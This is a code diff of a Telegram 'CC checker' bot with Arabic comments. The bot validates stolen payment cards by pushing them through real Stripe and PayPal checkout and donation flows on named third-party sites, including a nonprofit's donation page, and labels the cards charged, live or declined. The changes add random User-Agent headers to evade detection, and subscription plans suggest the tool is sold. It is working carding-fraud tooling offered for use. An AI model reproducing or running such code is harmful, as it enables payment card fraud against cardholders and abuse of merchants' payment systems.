@@ -3,7 +3,7 @@
 
 """
 Obeida Online - Real Multi Gateway CC Checker Bot
-Version: 14.0 - Final All Gateways Matched Original Code
+Version: 15.0 - Final with Random User-Agent
 Author: @ObeidaOnline
 Channel: https://t.me/ObeidaTrading
 """
@@ -128,7 +128,7 @@ SUBSCRIPTION_PLANS = {
 # ==================== تهيئة البوت ====================
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
 fake = Faker()
-ua = UserAgent()
+ua = UserAgent()  # مكتبة User-Agent عشوائي
 
 # متغيرات عامة
 user_last_file = {}
@@ -720,9 +720,9 @@ class ResultFormatter:
         frames = ["◐", "◓", "◑", "◒"]
         return frames[frame % len(frames)]
 
-# ==================== بوابة Stripe 1 (مطابقة للكود الأصلي) ====================
+# ==================== بوابة Stripe 1 ====================
 class StripeGateway1:
-    """Stripe Gateway 1 - SetupIntent Auth"""
+    """Stripe Gateway 1 - SetupIntent Auth مع User-Agent عشوائي"""
     
     @staticmethod
     def normalize_url(url):
@@ -767,9 +767,12 @@ class StripeGateway1:
                 domain = f"{parsed.scheme}://{parsed.netloc}"
                 email = self.generate_random_email()
                 
+                # استخدام User-Agent عشوائي
+                random_ua = ua.random
+                
                 headers = {
                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
+                    'user-agent': random_ua
                 }
                 
                 resp = await session.get(site_url, headers=headers)
@@ -794,7 +797,7 @@ class StripeGateway1:
                     await session.post(site_url, headers=headers, data=register_data)
                 
                 add_payment_url = f"{domain}/my-account/add-payment-method/"
-                resp = await session.get(add_payment_url, headers={'user-agent': headers['user-agent']})
+                resp = await session.get(add_payment_url, headers={'user-agent': random_ua})
                 payment_page_text = await resp.text()
                 
                 add_card_nonce = (self.gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
@@ -822,7 +825,7 @@ class StripeGateway1:
                     'content-type': 'application/x-www-form-urlencoded',
                     'origin': 'https://js.stripe.com',
                     'referer': 'https://js.stripe.com/',
-                    'user-agent': headers['user-agent']
+                    'user-agent': random_ua
                 }
                 
                 stripe_data = {
@@ -876,7 +879,7 @@ class StripeGateway1:
                     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                     'origin': domain,
                     'x-requested-with': 'XMLHttpRequest',
-                    'user-agent': headers['user-agent']
+                    'user-agent': random_ua
                 }
                 
                 endpoints = [
@@ -916,16 +919,16 @@ class StripeGateway1:
         except Exception as e:
             return False, f"⚠️ System Error: {str(e)[:50]}"
 
-# ==================== بوابة Stripe 2 (مطابقة لـ Stripe v1) ====================
+# ==================== بوابة Stripe 2 ====================
 class StripeGateway2(StripeGateway1):
     """Stripe Gateway 2 - نفس طريقة Stripe v1"""
     
     async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
         return await super().process_card("https://copenhagensilver.com", card_data)
 
-# ==================== بوابة PayPal (مطابقة للكود الأصلي) ====================
+# ==================== بوابة PayPal ====================
 class PayPalGateway:
-    """PayPal Charge Gateway - مطابق تماماً للكود الأصلي @MUMIRU_BRO"""
+    """PayPal Charge Gateway - مع User-Agent عشوائي"""
     
     FIRST_NAMES = [
         "James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda",
@@ -987,15 +990,17 @@ class PayPalGateway:
         return "VISA"
     
     async def check_card(self, card_data: Dict) -> Tuple[bool, str]:
-        """فحص بطاقة عبر PayPal - مطابق تماماً للكود الأصلي"""
+        """فحص بطاقة عبر PayPal - مع User-Agent عشوائي"""
         try:
-            # استخدام requests.Session() مثل الكود الأصلي
+            donor = self.random_donor()
             session = requests.Session()
             session.verify = True
-            ua_str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+            
+            # استخدام User-Agent عشوائي
+            random_ua = ua.random
             
             ajax_headers = {
-                "User-Agent": ua_str,
+                "User-Agent": random_ua,
                 "Accept": "*/*",
                 "Accept-Language": "en-US,en;q=0.9",
                 "Origin": "https://awwatersheds.org",
@@ -1004,7 +1009,7 @@ class PayPalGateway:
             }
             
             # 1. Scrape tokens
-            r = session.get("https://awwatersheds.org/donate/", headers={"User-Agent": ua_str}, timeout=20)
+            r = session.get("https://awwatersheds.org/donate/", headers={"User-Agent": random_ua}, timeout=20)
             html = r.text
             
             h = re.search(r'name="give-form-hash" value="(.*?)"', html)
@@ -1026,8 +1031,6 @@ class PayPalGateway:
             }
             
             # 2. Register donation
-            donor = self.random_donor()
-            
             data = {
                 "give-honeypot": "",
                 "give-form-id-prefix": tokens['pfx'],
@@ -1087,7 +1090,7 @@ class PayPalGateway:
                 "Paypal-Client-Context": order_id,
                 "X-App-Name": "standardcardfields",
                 "Paypal-Client-Metadata-Id": order_id,
-                "User-Agent": ua_str,
+                "User-Agent": random_ua,
                 "Content-Type": "application/json",
                 "Origin": "https://www.paypal.com",
                 "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
@@ -1198,28 +1201,28 @@ class PayPalGateway:
             )
             approve_text = r.text
             
-            # 6. تحليل النتيجة (مطابق للكود الأصلي)
+            # 6. تحليل النتيجة
             t = paypal_text.upper() if paypal_text else ""
             
             # نتائج CHARGED
             if 'APPROVESTATE":"APPROVED' in t:
-                return True, "CHARGED - Payment Approved!"
+                return True, "✅ CHARGED - Payment Approved!"
             if 'PARENTTYPE":"AUTH' in t and '"CARTID"' in t:
-                return True, "CHARGED - Auth Successful!"
+                return True, "✅ CHARGED - Auth Successful!"
             if '"APPROVEGUESTPAYMENTWITHCREDITCARD"' in t and '"ERRORS"' not in t and '"CARTID"' in t:
-                return True, "CHARGED!"
+                return True, "✅ CHARGED!"
             
-            # نتائج APPROVED/LIVE
+            # نتائج LIVE
             if 'CVV2_FAILURE' in t:
-                return True, "CVV2 FAILURE (Card is LIVE)"
+                return True, "💳 CVV2 FAILURE (Card is LIVE)"
             if 'INVALID_SECURITY_CODE' in t:
-                return True, "CCN - Invalid Security Code (LIVE)"
+                return True, "💳 CCN - Invalid Security Code (LIVE)"
             if 'INVALID_BILLING_ADDRESS' in t:
-                return True, "AVS FAILED (LIVE)"
+                return True, "✅ AVS FAILED (LIVE)"
             if 'EXISTING_ACCOUNT_RESTRICTED' in t:
-                return True, "Account Restricted (LIVE)"
+                return True, "⚠️ Account Restricted (LIVE)"
             if 'INSUFFICIENT_FUNDS' in t:
-                return True, "Insufficient Funds (LIVE CARD)"
+                return True, "💰 Insufficient Funds (LIVE CARD)"
             
             # نتائج DECLINED
             combined = t + " " + (approve_text.upper() if approve_text else "")
@@ -1253,27 +1256,19 @@ class PayPalGateway:
             
             for keyword, msg in declines:
                 if keyword in combined:
-                    return False, f"{msg}"
+                    return False, f"❌ {msg}"
             
-            # محاولة تحليل JSON
             try:
                 rj = json.loads(paypal_text)
                 if "errors" in rj:
-                    return False, rj["errors"][0].get("message", "Unknown")
+                    return False, f"❌ {rj['errors'][0].get('message', 'Unknown')}"
             except:
                 pass
             
-            try:
-                rj = json.loads(approve_text)
-                if rj.get("data", {}).get("error"):
-                    return False, str(rj["data"]["error"])
-            except:
-                pass
-            
-            return False, "UNKNOWN ERROR"
+            return False, "❌ DECLINED - Unknown Error"
             
         except Exception as e:
-            return False, f"Error: {str(e)[:50]}"
+            return False, f"⚠️ Error: {str(e)[:50]}"
 
 # ==================== بوابات الفحص ====================
 class RealGateways:
@@ -1404,7 +1399,7 @@ class UserInterface:
         markup.add(InlineKeyboardButton("⛔ إيقاف الفحص", callback_data=f"stop_{check_id}"))
         return markup
 
-# ==================== معالج الأوامر ====================
+# ==================== معالج الأوامر (مختصر) ====================
 class CommandHandler:
     def __init__(self):
         self.gateways = RealGateways()
@@ -2301,7 +2296,7 @@ def setup():
     
     print(Fore.GREEN + "🚀 البوت يعمل..." + Style.RESET_ALL)
     print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)
-    print(Fore.YELLOW + "📌 البوابات المتاحة (مطابقة للكود الأصلي):" + Style.RESET_ALL)
+    print(Fore.YELLOW + "📌 البوابات المتاحة (مع User-Agent عشوائي):" + Style.RESET_ALL)
     print(Fore.WHITE + "   💳 Stripe v1: /st1 (فردي) | /st1m (ملف)" + Style.RESET_ALL)
     print(Fore.WHITE + "   💎 Stripe v2: /st2 (فردي) | /st2m (ملف)" + Style.RESET_ALL)
     print(Fore.WHITE + "   💸 PayPal Charge: /pay (فردي) | /paym (ملف)" + Style.RESET_ALL)
